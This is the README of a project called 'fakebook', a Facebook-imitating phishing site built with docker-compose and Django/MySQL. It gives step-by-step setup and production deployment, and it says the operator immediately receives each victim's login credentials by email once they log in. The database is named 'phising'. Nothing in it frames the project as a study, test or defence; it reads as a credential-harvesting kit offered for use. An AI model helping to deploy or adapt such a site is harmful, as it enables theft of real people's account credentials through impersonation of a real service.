# Fake facebook website
This project is a fake facebook website using docker-compose.

if an error raise using this program please look at logs/errors.log

----------------

if all is set correctly you'll receive immedialy by email the credential when an user is logged in.
## Requirements 
- docker
- docker-compose

## To run this program on your machine
- ```git clone https://github.com/makan-dianka/fakebook.git```

- ```cd fakebook```

### Create file .env into web folder where is manage.py
set these values
- DEBUG=1
- EMAIL_HOST_USER="changeme"   here must be a google account. such @gmail.com
- EMAIL_HOST_PASSWORD="changeme" 

- HOST=db
- PORT=3306
- NAME=phising
- USER_DB=root
- PASSWORD=root

- ALLOWED_HOSTS="changeme_in_production to ip adress or dns"

### Create database
- ```docker start mysql_db && docker exec -it mysql_db bash```

you'll get bash of container mysql. Then connect you to mysql server

- ```mysql -uroot -proot```

Then create database name phising

- ```create database phising```

- ```exit```

### Run docker-compose local
- ```docker-compose up```

### Run docker-compose in production mode
- ```docker-compose -f docker-compose-prod.yml --env-file ./web/.env up```

### Create superuser
Open new bash then type :

- ```docker exec -it myapp bash```

then 


- ```python manage.py createsuperuser```



### You're done !

You can visit the website in dev mode > ```localhost:2023``` or ```allowed_hosts:2023``` in prod mode

phpmyadmin > ```localhost:8080```